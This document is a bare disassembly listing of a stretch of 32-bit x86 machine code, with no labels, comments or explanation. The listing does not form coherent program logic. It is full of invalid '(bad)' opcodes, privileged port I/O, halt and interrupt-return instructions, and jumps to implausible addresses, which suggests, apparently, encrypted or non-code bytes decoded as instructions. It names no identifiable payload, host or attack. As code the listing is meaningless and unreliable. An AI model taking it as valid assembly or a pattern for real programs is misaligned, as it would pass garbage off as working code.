  40c8e9:	adc    dh,BYTE PTR [esi]
  40c8eb:	aaa    
  40c8ec:	aaa    
  40c8ed:	mov    ecx,DWORD PTR [edx-0x760d437f]
  40c8f3:	dec    edi
  40c8f4:	jl     0x40c8d8
  40c8f6:	fidiv  DWORD PTR [ecx]
  40c8f8:	(bad)  
  40c8fa:	shl    BYTE PTR [esi+0x4ba0376b],0xcc
  40c901:	cs push ebx
  40c903:	jo     0x40c8fc
  40c905:	in     eax,0x97
  40c907:	and    DWORD PTR [ebx],ecx
  40c909:	or     esp,0xfffffffa
  40c90c:	aaa    
  40c90d:	fimul  DWORD PTR [esi]
  40c90f:	pusha  
  40c910:	scas   al,BYTE PTR es:[edi]
  40c911:	jae    0x40c936
  40c913:	sti    
  40c914:	inc    eax
  40c915:	jge    0x40c8b1
  40c917:	dec    eax
  40c918:	iret   
  40c919:	popf   
  40c91a:	aaa    
  40c91b:	push   eax
  40c91c:	push   eax
  40c91d:	or     DWORD PTR es:[esi-0x5b],edi
  40c921:	add    BYTE PTR [edx+esi*2-0x12],0xfc
  40c926:	cmp    dh,BYTE PTR [edx]
  40c928:	sub    al,BYTE PTR [ebx-0x27]
  40c92b:	cmp    eax,0xe839d85f
  40c930:	out    dx,al
  40c931:	mov    ebx,0x61c7c258
  40c936:	or     BYTE PTR [ecx-0x29],bh
  40c939:	pop    ds
  40c93a:	test   eax,0xb810c0cd
  40c93f:	cmp    DWORD PTR [edi],edi
  40c941:	add    ecx,DWORD PTR [esi+0x2c280432]
  40c947:	mov    cl,0x4b
  40c949:	push   esp
  40c94a:	cwde   
  40c94b:	jle    0x40c969
  40c94d:	inc    ebx
  40c94e:	pop    edx
  40c94f:	ror    DWORD PTR [edi+0x0],cl
  40c952:	push   ds
  40c953:	xor    DWORD PTR [ebx+0x2b8bee7c],esi
  40c959:	cld    
  40c95a:	jecxz  0x40c97b
  40c95c:	std    
  40c95d:	adc    al,0xff
  40c95f:	cld    
  40c960:	lahf   
  40c961:	jle    0x40c8f7
  40c963:	inc    esi
  40c964:	mov    ds:0xba30f361,eax
  40c969:	out    dx,eax
  40c96a:	pop    esp
  40c96b:	and    al,0xe5
  40c96d:	repz (bad) 
  40c970:	and    eax,0x1419976e
  40c975:	in     eax,dx
  40c976:	pop    es
  40c977:	xchg   ebp,eax
  40c978:	xlat   BYTE PTR ds:[ebx]
  40c979:	jle    0x40c9e1
  40c97b:	data16 xchg BYTE PTR [eax],ch
  40c97e:	dec    edx
  40c97f:	clc    
  40c980:	lds    ebx,FWORD PTR [edi-0x3]
  40c983:	xor    ch,BYTE PTR [edi]
  40c985:	lahf   
  40c986:	xchg   edx,eax
  40c987:	and    al,0x4c
  40c989:	loope  0x40c914
  40c98b:	es enter 0x4932,0x2c
  40c990:	mov    edx,eax
  40c992:	test   BYTE PTR [eax],ch
  40c994:	dec    edx
  40c995:	hlt    
  40c996:	sub    al,0x3c
  40c998:	inc    ebp
  40c999:	enter  0x279e,0xf0
  40c99d:	adc    ah,BYTE PTR [ecx-0x78ab0eeb]
  40c9a3:	mov    bh,0x7a
  40c9a5:	mov    esp,0x3666ef50
  40c9aa:	pop    DWORD PTR [esi-0x1824f507]
  40c9b0:	xchg   esi,eax
  40c9b1:	mov    al,ds:0xf7ceac45
  40c9b6:	pop    esp
  40c9b7:	out    0xe1,al
  40c9b9:	adc    bh,bh
  40c9bb:	call   0xe9434b9
  40c9c0:	pop    esi
  40c9c1:	or     bh,al
  40c9c3:	dec    eax
  40c9c4:	pop    eax
  40c9c5:	lods   al,BYTE PTR ds:[esi]
  40c9c6:	(bad)  
  40c9c7:	and    edx,ecx
  40c9c9:	xor    ecx,DWORD PTR [ebx]
  40c9cb:	and    esp,DWORD PTR [ecx+0x67]
  40c9ce:	add    al,BYTE PTR [esi-0x76366f1f]
  40c9d4:	mov    bh,BYTE PTR [ebp-0x4e]
  40c9d7:	cmp    al,0x93
  40c9d9:	xchg   ebp,eax
  40c9da:	xor    ch,BYTE PTR [ebp+0x5632e893]
  40c9e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9e1:	sub    eax,0xd6eddf17
  40c9e6:	mov    ah,0x9b
  40c9e8:	jb     0x40c9ed
  40c9ea:	or     ah,cl
  40c9ec:	xchg   ebx,eax
  40c9ed:	dec    esi
  40c9ee:	add    eax,0x47fb2316
  40c9f3:	(bad)  
  40c9f4:	pop    ss
  40c9f5:	and    eax,esp
  40c9f7:	mov    bh,0x53
  40c9f9:	mov    ebx,0x9f6f841d
  40c9fe:	adc    edx,edx
  40ca00:	or     DWORD PTR [esi],esi
  40ca02:	dec    ecx
  40ca03:	mov    ds:0x7eb47003,al
  40ca08:	push   ss
  40ca09:	push   cs
  40ca0a:	mov    ecx,0x5e0db978
  40ca0f:	test   eax,0xc3339f0
  40ca14:	sar    BYTE PTR [ecx+0x76],0xb3
  40ca18:	sahf   
  40ca19:	popa   
  40ca1a:	or     dl,dl
  40ca1c:	icebp  
  40ca1d:	or     al,0xa4
  40ca1f:	mov    eax,ds:0x21144e83
  40ca24:	xchg   esi,eax
  40ca25:	call   0x450c84f7
  40ca2a:	in     al,dx
  40ca2b:	lods   eax,DWORD PTR ds:[esi]
  40ca2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca2d:	and    al,BYTE PTR [edx]
  40ca2f:	iret   
  40ca30:	push   ebx
  40ca31:	adc    ecx,DWORD PTR [edi-0x70]
  40ca34:	xchg   BYTE PTR [eax-0x2c],cl
  40ca37:	add    BYTE PTR [edi-0x840e31c],cl
  40ca3d:	fxch   st(3)
  40ca3f:	mov    WORD PTR [ebp-0x360c903],cs
  40ca45:	xchg   ecx,eax
  40ca46:	out    dx,eax
  40ca47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca48:	push   esi
  40ca49:	stos   DWORD PTR es:[edi],eax
  40ca4a:	shr    DWORD PTR [esi-0x49],1
  40ca4d:	ins    DWORD PTR es:[edi],dx
  40ca4e:	xor    dl,dh
  40ca50:	mov    ds:0x4a13b8c1,al
  40ca55:	enter  0xedff,0x14
  40ca59:	or     al,0x14
  40ca5b:	xchg   BYTE PTR [ecx],ah
  40ca5d:	inc    ecx
  40ca5e:	adc    BYTE PTR [eax],dh
  40ca60:	xor    esi,DWORD PTR [ebx]
  40ca62:	ret    
  40ca63:	outs   dx,DWORD PTR ds:[esi]
  40ca64:	(bad)  
  40ca65:	out    dx,al
  40ca66:	jecxz  0x40cae4
  40ca68:	loope  0x40ca35
  40ca6a:	push   edi
  40ca6b:	sbb    dh,al
  40ca6d:	or     ecx,DWORD PTR [eax+0x29a80c60]
  40ca73:	sbb    WORD PTR [ebx+0x3d],cx
  40ca77:	sbb    eax,0x8589263a
  40ca7c:	jb     0x40ca13
  40ca7e:	jns    0x40ca66
  40ca80:	fisubr DWORD PTR [edx]
  40ca82:	cmp    eax,0xf630feba
  40ca87:	pop    ebp
  40ca88:	cmp    al,0x83
  40ca8a:	jo     0x40ca10
  40ca8c:	imul   ebx,esp,0x23
  40ca8f:	or     esi,ebp
  40ca91:	cmc    
  40ca92:	jbe    0x40ca2d
  40ca94:	test   eax,0x5d09aecb
  40ca99:	sbb    al,BYTE PTR [esi-0x58b41a0]
  40ca9f:	in     eax,dx
  40caa0:	mov    bl,0xf8
  40caa2:	rol    DWORD PTR [ecx+0x1],0x90
  40caa6:	popa   
  40caa7:	add    bl,BYTE PTR [ecx]
  40caa9:	add    BYTE PTR [edx-0x30],dl
  40caac:	xchg   esp,eax
  40caad:	adc    DWORD PTR [eax+0x33],edx
  40cab0:	inc    esp
  40cab1:	sbb    eax,0x31c49007
  40cab6:	sub    DWORD PTR [edi],0xc801ebaf
  40cabc:	sbb    BYTE PTR [edx-0x310d124d],ah
  40cac2:	ja     0x40cac0
  40cac4:	(bad)  
  40cac5:	mov    bh,0x9b
  40cac7:	or     BYTE PTR [edx+edx*1],al
  40caca:	ss das 
  40cacc:	mov    ebp,0x455bd3fa
  40cad1:	stos   BYTE PTR es:[edi],al
  40cad2:	neg    DWORD PTR [ebx-0x6afe041a]
  40cad8:	dec    edx
  40cad9:	add    eax,0xa53bf9d3
  40cade:	add    eax,0x7565d9bb
  40cae3:	(bad)  
  40cae5:	adc    edi,DWORD PTR [esi-0x3e3c0e25]
  40caeb:	add    BYTE PTR [ebx+ebx*4+0x91553c0],al
  40caf2:	or     eax,0x966721a3
  40caf7:	pop    ebx
  40caf8:	dec    eax
  40caf9:	mul    al
  40cafb:	data16 int3 
  40cafd:	xchg   ebp,eax
  40cafe:	sub    BYTE PTR [edx],ah
  40cb00:	dec    esi
  40cb01:	jb     0x40cb16
  40cb03:	sbb    esi,DWORD PTR [ebx-0x77a60bc]
  40cb09:	sbb    DWORD PTR [edi-0x6faab9a0],edx
  40cb0f:	mov    cs,WORD PTR ds:0x62237520
  40cb15:	jle    0x40cb68
  40cb17:	(bad)  
  40cb18:	and    eax,0xe867a449
  40cb1d:	jmp    0xe875543d
  40cb22:	sub    BYTE PTR [ebx],ch
  40cb24:	sahf   
  40cb25:	add    al,0x61
  40cb27:	xor    cl,bh
  40cb29:	outs   dx,DWORD PTR ds:[esi]
  40cb2a:	cld    
  40cb2b:	mul    BYTE PTR ds:0xc7bf9ac6
  40cb31:	(bad)  
  40cb33:	mov    ebx,0x3870c1df
  40cb38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb39:	fucomi st,st(5)
  40cb3b:	jmp    0xfde9:0x140a
  40cb41:	cmp    ecx,DWORD PTR [ecx-0x8]
  40cb44:	popf   
  40cb45:	sbb    BYTE PTR [edx+0x60c1bf9],al
  40cb4b:	sub    al,0x2e
  40cb4d:	cs jb  0x40cb31
  40cb50:	ret    0xbf1a
  40cb53:	stc    
  40cb54:	cmp    ecx,edi
  40cb56:	mov    cl,0xd9
  40cb58:	push   ds
  40cb59:	add    ebp,DWORD PTR [edi+0xc]
  40cb5c:	inc    esp
  40cb5d:	pop    ebp
  40cb5e:	aad    0x4c
  40cb60:	nop
  40cb61:	mov    DWORD PTR [esi-0x3c6646c],esi
  40cb67:	retf   0xe810
  40cb6a:	add    DWORD PTR [esi-0xbb43fd1],ebx
  40cb70:	sub    esp,DWORD PTR [ebp+eiz*1-0x50]
  40cb74:	and    al,0x3f
  40cb76:	pop    ss
  40cb77:	pop    eax
  40cb78:	xor    DWORD PTR [ebx-0x4b451ec],edi
  40cb7e:	out    dx,al
  40cb7f:	sahf   
  40cb80:	enter  0x671d,0x2d
  40cb84:	jmp    FWORD PTR [esi]
  40cb86:	cld    
  40cb87:	aaa    
  40cb88:	div    DWORD PTR [eax+0x5d]
  40cb8b:	xchg   DWORD PTR [esi],ecx
  40cb8d:	arpl   WORD PTR [eax],si
  40cb8f:	mov    BYTE PTR [ecx-0x5a],al
  40cb92:	xlat   BYTE PTR ds:[ebx]
  40cb93:	mov    cl,0x53
  40cb95:	mov    edi,0x750d7b85
  40cb9a:	sahf   
  40cb9b:	sbb    al,BYTE PTR [edi]
  40cb9d:	(bad)  
  40cb9e:	or     BYTE PTR [eax+0x2258a2fe],ch
  40cba4:	inc    esp
  40cba5:	inc    edx
  40cba6:	mov    ebp,0xc5c51312
  40cbab:	leave  
  40cbac:	pop    ebx
  40cbad:	add    BYTE PTR [ebx-0x248a34df],bl
  40cbb3:	cmp    ch,ch
  40cbb5:	iret   
  40cbb6:	add    dl,BYTE PTR ds:[eax+0xc]
  40cbba:	shl    BYTE PTR [edi+0x12],0x7f
  40cbbe:	and    BYTE PTR [edx+0xc],0x9e
  40cbc2:	xchg   BYTE PTR [edx-0x5867a2da],dh
  40cbc8:	retf   
  40cbc9:	sub    DWORD PTR [ecx-0x2f3cf1e9],0xffffffce
  40cbd0:	dec    edx
  40cbd1:	xor    ecx,DWORD PTR [esp]
  40cbd4:	scas   eax,DWORD PTR es:[edi]
  40cbd5:	add    ch,ah
  40cbd7:	sbb    WORD PTR [esi-0x72],bp
  40cbdb:	lock pop ebp
  40cbdd:	sub    esi,DWORD PTR [esi-0x76d9fe8f]
  40cbe3:	repnz dec ebx
  40cbe5:	(bad)  
  40cbe6:	jno    0x40cc34
  40cbe8:	test   eax,0x7b7b665c
  40cbed:	fwait
  40cbee:	or     edx,DWORD PTR [edi]
  40cbf0:	xchg   DWORD PTR [edx-0x779dad75],edi
  40cbf6:	mov    ds:0xf04c3084,al
  40cbfb:	add    eax,ebp
  40cbfd:	cld    
  40cbfe:	push   edx
  40cbff:	sbb    bl,BYTE PTR [esi*8-0x30fdd40d]
  40cc06:	mov    BYTE PTR ds:0x51819964,0xd
  40cc0d:	sbb    al,0xe9
  40cc0f:	imul   ecx,DWORD PTR [edi-0x376e298b],0x38
  40cc16:	ret    0xd6ce
  40cc19:	add    edx,edx
  40cc1b:	or     bh,BYTE PTR ds:0x69bf0e66
  40cc21:	push   ds
  40cc22:	std    
  40cc23:	jo     0x40cba6
  40cc25:	pop    edi
  40cc26:	clc    
  40cc27:	aad    0x65
  40cc29:	addr16 mov si,0xf7c0
  40cc2e:	jg     0x40cc12
  40cc30:	popf   
  40cc31:	or     al,0x6
  40cc33:	add    eax,DWORD PTR [esi]
  40cc35:	add    ecx,0x8
  40cc38:	adc    ecx,eax
  40cc3a:	xor    eax,DWORD PTR [edx+0x2bbf9f22]
  40cc40:	stc    
  40cc41:	repz jns 0x40cc44
  40cc44:	jp     0x40cc03
  40cc46:	push   ds
  40cc47:	adc    edx,DWORD PTR [ebx]
  40cc49:	adc    edx,esp
  40cc4b:	jmp    0x40cc9a
  40cc4d:	inc    bl
  40cc4f:	das    
  40cc50:	cld    
  40cc51:	and    DWORD PTR [edi-0x71],eax
  40cc54:	cmovs  esp,esp
  40cc57:	or     al,0x88
  40cc59:	mov    BYTE PTR es:[edx-0x6f6db946],dl
  40cc60:	inc    esp
  40cc61:	xor    DWORD PTR [ecx-0x14],edx
  40cc64:	sub    edx,DWORD PTR ds:0x23888a20
  40cc6a:	mov    eax,ds:0x41492172
  40cc6f:	bound  esi,QWORD PTR [ebp+0x60]
  40cc72:	inc    ebx
  40cc73:	lods   al,BYTE PTR ds:[esi]
  40cc74:	pop    edx
  40cc75:	dec    edx
  40cc76:	jp     0x40cc08
  40cc78:	push   ebp
  40cc79:	or     esi,DWORD PTR [eax-0x78]
  40cc7c:	lds    edx,FWORD PTR ds:0xcbc482cd
  40cc82:	push   ds
  40cc83:	rol    DWORD PTR [bp+si+0x66],1
  40cc87:	sbb    ebp,ecx
  40cc89:	xor    eax,0xf74fdc2c
  40cc8e:	jns    0x40cc59
  40cc90:	test   al,0xb8
  40cc92:	pop    ss
  40cc93:	outs   dx,BYTE PTR ds:[esi]
  40cc94:	inc    esi
  40cc95:	loop   0x40cc63
  40cc97:	fstp   QWORD PTR ds:[edi]
  40cc9a:	ror    BYTE PTR ds:0x23884e03,cl
  40cca0:	lock cmp eax,0x112f1898
  40cca6:	(bad)  
  40cca7:	jb     0x40cc2d
  40cca9:	add    DWORD PTR [eax-0x3b56ad0b],ebx
  40ccaf:	(bad)  
  40ccb0:	(bad)  
  40ccb1:	xchg   esi,eax
  40ccb2:	int    0xe6
  40ccb4:	in     al,dx
  40ccb5:	cmp    al,0x5b
  40ccb7:	enter  0x746d,0x1
  40ccbb:	ret    0x864d
  40ccbe:	add    bh,BYTE PTR [ebx-0x62]
  40ccc1:	aas    
  40ccc2:	inc    edx
  40ccc3:	dec    esp
  40ccc4:	jp     0x40cc55
  40ccc6:	out    0xba,al
  40ccc8:	scas   al,BYTE PTR es:[edi]
  40ccc9:	jp     0x40cc6b
  40cccb:	xchg   BYTE PTR ds:[ebx-0x22472f04],bl
  40ccd2:	pop    esp
  40ccd3:	cmp    eax,edx
  40ccd5:	cmc    
  40ccd6:	lods   al,BYTE PTR ds:[esi]
  40ccd7:	cmc    
  40ccd8:	xlat   BYTE PTR ds:[ebx]
  40ccd9:	pop    ebx
  40ccda:	jbe    0x40cc7b
  40ccdc:	(bad)
  40ccdf:	lods   eax,DWORD PTR ds:[esi]
  40cce0:	cmc    
  40cce1:	dec    eax
  40cce2:	aas    
  40cce3:	xchg   ebx,eax
  40cce4:	les    ecx,FWORD PTR [ecx-0x14]
  40cce7:	mov    eax,ds:0x575700a3
  40ccec:	aaa    
  40cced:	imul   esi,DWORD PTR [ebp-0x7b10cb43],0x5e1ec1d4
  40ccf7:	dec    esp
  40ccf8:	sub    esi,esi
  40ccfa:	hlt    
  40ccfb:	add    BYTE PTR ds:0xcdfd23f7,dh
  40cd01:	shr    DWORD PTR [ebx+ecx*2+0x53],0x96
  40cd06:	call   0x456630dd
  40cd0b:	mov    al,0xdf
  40cd0d:	adc    BYTE PTR [esi-0x4a322af5],bh
  40cd13:	push   ebp
  40cd14:	xor    DWORD PTR [ecx],edx
  40cd16:	cmp    edi,DWORD PTR [edi+0x46]
  40cd19:	es fs mov dl,0xf9
  40cd1d:	(bad)  
  40cd1f:	rcr    DWORD PTR [ecx],cl
  40cd21:	in     al,dx
  40cd22:	in     eax,0x5f
  40cd24:	(bad)  
  40cd25:	fcom   QWORD PTR [ecx+0x66]
  40cd28:	data16 (bad) 
  40cd2a:	js     0x40cd0b
  40cd2c:	mov    bh,0xbd
  40cd2e:	sahf   
  40cd2f:	jae    0x40cd18
  40cd31:	into   
  40cd32:	xor    DWORD PTR [eax],ebx
  40cd34:	or     al,0x32
  40cd36:	dec    ecx
  40cd37:	pop    edx
  40cd38:	ja     0x40cd6c
  40cd3a:	cli    
  40cd3b:	in     eax,0x89
  40cd3d:	mov    esi,0xc37cd968
  40cd42:	jge    0x40cd3f
  40cd44:	div    cl
  40cd46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd47:	(bad)  
  40cd48:	mov    ebp,0xdbfe67c8
  40cd4d:	imul   eax,DWORD PTR [esi],0xfd251ed1
  40cd53:	test   eax,0x44914ca4
  40cd58:	mov    eax,ds:0x8e263880
  40cd5d:	cmp    eax,0xbcf127fd
  40cd62:	add    al,0x89
  40cd64:	xchg   DWORD PTR [edi-0x70e639dc],edx
  40cd6a:	popa   
  40cd6b:	add    al,BYTE PTR [edx]
  40cd6d:	mov    eax,ds:0x9a597672
  40cd72:	push   esp
  40cd73:	adc    DWORD PTR [edi-0x57],edi
  40cd76:	sbb    ecx,esi
  40cd78:	sbb    eax,0x6801d263
  40cd7d:	imul   ebx,DWORD PTR [edi-0x5aad541b],0x1ce39ddb
  40cd87:	inc    esi
  40cd88:	and    BYTE PTR [ebx],dh
  40cd8a:	test   BYTE PTR ds:0xe9636e3d,0xd0
  40cd91:	mov    ebp,0x55a876ab
  40cd96:	push   ebp
  40cd97:	adc    eax,0x8901274a
  40cd9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd9d:	bound  eax,QWORD PTR [eax]
  40cd9f:	les    edx,FWORD PTR [esp+edi*2+0x18d02b35]
  40cda6:	sti    
  40cda7:	fdivr  st(1),st
  40cda9:	addr16 mov ds:0x8b4c,eax
  40cdad:	cmp    eax,0x536e0362
  40cdb2:	and    dl,BYTE PTR [eax]
  40cdb4:	shl    DWORD PTR [esi-0x73],cl
  40cdb7:	add    BYTE PTR [esp+eiz*8-0x4d53f32],cl
  40cdbe:	fwait
  40cdbf:	mov    bh,0x1
  40cdc1:	js     0x40cddc
  40cdc3:	aad    0x60
  40cdc5:	daa    
  40cdc6:	clc    
  40cdc7:	or     DWORD PTR [eax],edi
  40cdc9:	sub    al,ch
  40cdcb:	mov    ch,0xb3
  40cdcd:	xchg   esp,eax
  40cdce:	in     eax,dx
  40cdcf:	les    eax,FWORD PTR [esi+ebp*2]
  40cdd2:	fs lahf 
  40cdd4:	jns    0x40ce04
  40cdd6:	jae    0x40cd97
  40cdd8:	mov    eax,ds:0x96a4d3d6
  40cddd:	(bad)  
  40cdde:	adc    dh,ch
  40cde0:	sub    DWORD PTR [edx],0x2f673295
  40cde6:	pop    esp
  40cde7:	mov    bx,0xd815
  40cdeb:	xlat   BYTE PTR ds:[ebx]
  40cdec:	push   ebx
  40cded:	(bad)
  40cdf1:	xor    dl,dl
  40cdf3:	iret   
  40cdf4:	sbb    eax,0xb81e938
  40cdf9:	or     BYTE PTR [edi+eiz*8],bl
  40cdfc:	pop    ebp
  40cdfd:	xor    eax,DWORD PTR [esi+ecx*2]
  40ce00:	jbe    0x40cdbd
  40ce02:	cmp    DWORD PTR [esi],edi
  40ce04:	mov    ch,0x21
  40ce06:	in     al,dx
  40ce07:	mov    al,0x5d
  40ce09:	dec    edx
  40ce0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce0b:	sbb    eax,edi
  40ce0d:	rol    BYTE PTR [eax-0x23],cl
  40ce10:	add    al,0x64
  40ce12:	adc    DWORD PTR [edx],edx
  40ce14:	sub    BYTE PTR [ecx+0x47e05ad1],dh
  40ce1a:	jg     0x40ce18
  40ce1c:	dec    edi
  40ce1d:	cdq    
  40ce1e:	sahf   
  40ce1f:	outs   dx,BYTE PTR ds:[esi]
  40ce20:	repnz cli 
  40ce22:	pop    es
  40ce23:	out    dx,al
  40ce24:	in     al,0xd4
  40ce26:	test   eax,0x38990053
  40ce2b:	hlt    
  40ce2c:	and    dl,BYTE PTR ds:0x40cc7ae0
  40ce32:	dec    edx
  40ce33:	xor    eax,0x81c0e08f
  40ce38:	add    esi,esp
  40ce3a:	jp     0x40ce4d
  40ce3c:	mov    edi,0x738f1bf2
  40ce41:	jmp    0x8e29e790
  40ce46:	adc    edi,0x0
  40ce49:	add    dh,ch
  40ce4b:	cmp    al,0x52
  40ce4d:	fdiv   DWORD PTR [edx+ebx*2]
  40ce50:	stos   BYTE PTR es:[edi],al
  40ce51:	js     0x40cdf9
  40ce53:	repnz push ss
  40ce55:	les    ecx,FWORD PTR [ecx+0x2291a78f]
  40ce5b:	sahf   
  40ce5c:	cmp    BYTE PTR [eax],0x25
  40ce5f:	cmp    ch,bl
  40ce61:	adc    eax,0xfba7efb4
  40ce66:	push   edi
  40ce67:	dec    eax
  40ce68:	dec    ebp
  40ce69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce6a:	out    0x1d,al
  40ce6c:	sar    DWORD PTR [eax-0x7a],cl
  40ce6f:	xor    al,0x69
  40ce71:	xchg   DWORD PTR [ebx-0x6a4e8bdc],eax
  40ce77:	sub    al,0x5a
  40ce79:	xor    BYTE PTR [edi-0x12d14cd],dl
  40ce7f:	or     dl,BYTE PTR [ebx+0x1061c82a]
  40ce85:	inc    edx
  40ce86:	or     BYTE PTR [edx],dh
  40ce88:	jne    0x40ce93
  40ce8a:	repnz push 0xffffff80
  40ce8d:	push   esp
  40ce8e:	cmc    
  40ce8f:	add    BYTE PTR [ebx+0x1467bd44],dl
  40ce95:	sub    DWORD PTR [edi],0x22
  40ce98:	xchg   edx,eax
  40ce99:	and    al,0x24
  40ce9b:	mov    ?,WORD PTR [edx+0x78ee6581]
  40cea1:	hlt    
  40cea2:	cmp    al,0xcf
  40cea4:	(bad)  
  40cea5:	pop    esp
  40cea6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cea7:	iret   
  40cea8:	and    eax,0x2d02ae00
  40cead:	outs   dx,BYTE PTR ds:[esi]
  40ceae:	arpl   WORD PTR [ebx-0x5f5ffb97],di
  40ceb4:	mov    ebp,0xdf78219f
  40ceb9:	aaa    
  40ceba:	nop
  40cebb:	lea    ecx,ds:[ebx]
  40cebe:	xor    BYTE PTR [eax+ebx*2+0x2d1d049],bl
  40cec5:	adc    al,BYTE PTR [esi]
  40cec7:	(bad)  
  40cec8:	fwait
  40cec9:	rcr    DWORD PTR [eax-0x6faf6fd1],0x2d
  40ced0:	gs push edi
  40ced2:	dec    esp
  40ced3:	sar    BYTE PTR ds:0x1c2dbf2f,0xc
  40ceda:	mov    dl,0xbe
  40cedc:	outs   dx,BYTE PTR ds:[esi]
  40cedd:	popa   
  40cede:	push   0x1
  40cee0:	xchg   esp,eax
  40cee1:	cmp    BYTE PTR [ebx-0x1a],dh
  40cee4:	sub    ah,BYTE PTR [ecx+0x37]
  40cee7:	mov    al,0x1e
  40cee9:	add    BYTE PTR [eax+0x5b],al
  40ceec:	jl     0x40cf01
  40ceee:	cmp    al,0x2f
  40cef0:	inc    esi
  40cef1:	es xchg edx,eax
  40cef3:	xchg   edx,eax
  40cef4:	xchg   esp,eax
  40cef5:	js     0x40cf38
  40cef7:	or     cl,bl
  40cef9:	mov    bl,0x44
  40cefb:	dec    edi
  40cefc:	data16 add BYTE PTR [eax*1+0x7a2277db],ah
  40cf04:	jae    0x40ceb5
  40cf06:	mov    ds:0xee752965,al
  40cf0b:	add    BYTE PTR [edi-0x5fd64218],dh
  40cf11:	and    DWORD PTR [ebp-0x77],ebx
  40cf14:	add    eax,0xd5d2e650
  40cf19:	pop    ecx
  40cf1a:	dec    BYTE PTR [edi+0x7e39f67f]
  40cf20:	out    0xa7,al
  40cf22:	ds enter 0xe2e2,0x22
  40cf27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf28:	dec    edi
  40cf29:	lahf   
  40cf2a:	mov    dh,0x36
  40cf2c:	pushf  
  40cf2d:	and    ah,BYTE PTR [ebx]
  40cf2f:	lahf   
  40cf30:	xchg   ecx,eax
  40cf31:	pop    edx
  40cf32:	xlat   BYTE PTR ds:[ebx]
  40cf33:	bound  ecx,QWORD PTR [edi*8-0x42856082]
  40cf3a:	into   
  40cf3b:	cld    
  40cf3c:	cld    
  40cf3d:	cmp    al,0xbf
  40cf3f:	clc    
  40cf40:	lahf   
  40cf41:	mov    esi,0x6f4f13c8
  40cf46:	xchg   ebx,eax
  40cf47:	mov    BYTE PTR ds:0x54cdfd0d,al
  40cf4d:	jno    0x40ced8
  40cf4f:	dec    esp
  40cf50:	bound  esp,QWORD PTR [esp+ecx*1-0x77]
  40cf54:	hlt    
  40cf55:	dec    eax
  40cf56:	loop   0x40cfa0
  40cf58:	gs int3 
  40cf5a:	mov    DWORD PTR [edx-0x1e],esp
  40cf5d:	sub    dl,al
  40cf5f:	test   DWORD PTR [edx],0x802654a4
  40cf65:	in     al,dx
  40cf66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf67:	fwait
  40cf68:	sub    al,0x40
  40cf6b:	and    ebx,DWORD PTR [eax+0x4]
  40cf6e:	mov    al,ds:0xbf694c27
  40cf73:	push   0x50605aa1
  40cf78:	mov    esi,0xb5e909e2
  40cf7d:	mov    ch,0x88
  40cf7f:	and    dl,bh
  40cf81:	dec    ecx
  40cf82:	call   0x947d:0x22e8385f
  40cf89:	retf   0x545a
  40cf8c:	mov    esp,0x200000
  40cf91:	dec    ecx
  40cf92:	inc    esp
  40cf93:	inc    ecx
  40cf94:	push   esp
  40cf95:	sbb    al,0x53
  40cf97:	lds    edi,FWORD PTR [ecx]
  40cf99:	aaa    
  40cf9a:	int    0x39
  40cf9c:	sbb    ch,al
  40cf9e:	inc    edx
  40cf9f:	and    eax,0x8d258904
  40cfa4:	pop    edx
  40cfa5:	lahf   
  40cfa6:	mov    DWORD PTR [ecx+0xd817132],esi
  40cfac:	shl    BYTE PTR [ebp-0x5c],0x3b
  40cfb0:	mov    eax,0x7d024f00
  40cfb5:	outs   dx,BYTE PTR ds:[esi]
  40cfb6:	arpl   bx,bx
  40cfb8:	push   ebp
  40cfb9:	ins    DWORD PTR es:[edi],dx
  40cfba:	inc    eax
  40cfbb:	and    eax,edx
  40cfbd:	mov    edx,0x1801b1bd
  40cfc2:	imul   esp,DWORD PTR [esi+0x210f74e9],0x1c
  40cfc9:	into   
  40cfca:	in     al,dx
  40cfcb:	cld    
  40cfcc:	dec    ecx
  40cfcd:	cdq    
  40cfce:	pop    edx
  40cfcf:	inc    esi
  40cfd0:	ja     0x40d004
  40cfd2:	mov    es,WORD PTR [eax+0x36]
  40cfd5:	push   edx
  40cfd6:	or     eax,0xf20bd8c8
  40cfdb:	xlat   BYTE PTR ds:[ebx]
  40cfdc:	xor    eax,edi
  40cfde:	in     eax,dx
  40cfdf:	push   esi
  40cfe0:	test   DWORD PTR [edi],0x83063835
  40cfe6:	add    DWORD PTR [eax-0x6b],ecx
  40cfe9:	adc    al,0xd2
  40cfeb:	pusha  
  40cfec:	sbb    cl,BYTE PTR [edi+0x8]
  40cfef:	jl     0x40d050
  40cff1:	jo     0x40cfe9
  40cff3:	fsub   QWORD PTR [esi]
  40cff5:	sub    dl,BYTE PTR [ecx]
  40cff7:	push   0x24b1c5b6
  40cffc:	or     al,0x63
  40cffe:	sub    BYTE PTR [ecx],al
  40d000:	adc    DWORD PTR [esp-0x15eb85aa],edx
  40d007:	imul   dl
  40d009:	pop    edi
  40d00a:	xchg   al,ch
  40d00c:	in     eax,dx
  40d00d:	mov    cl,0xe4
  40d00f:	mov    bh,0x39
  40d011:	sti    
  40d012:	jbe    0x40d056
  40d014:	pop    es
  40d015:	push   es
  40d016:	dec    ebp
  40d017:	cmp    dh,bh
  40d019:	outs   dx,BYTE PTR ds:[esi]
  40d01a:	xor    eax,0x4c3a5a6
  40d01f:	rcl    ah,cl
  40d021:	ins    BYTE PTR es:[edi],dx
  40d022:	mov    BYTE PTR [edx],bl
  40d024:	daa    
  40d025:	xchg   esi,eax
  40d026:	daa    
  40d027:	stc    
  40d028:	pop    es
  40d029:	lahf   
  40d02a:	cld    
  40d02b:	add    edi,esi
  40d02d:	in     eax,dx
  40d02e:	(bad)  
  40d02f:	stc    
  40d030:	popa   
  40d031:	push   ss
  40d032:	pop    ss
  40d033:	pop    ss
  40d034:	cmp    DWORD PTR [ebx-0x1a],esi
  40d037:	or     al,0xa5
  40d039:	push   edx
  40d03a:	leave  
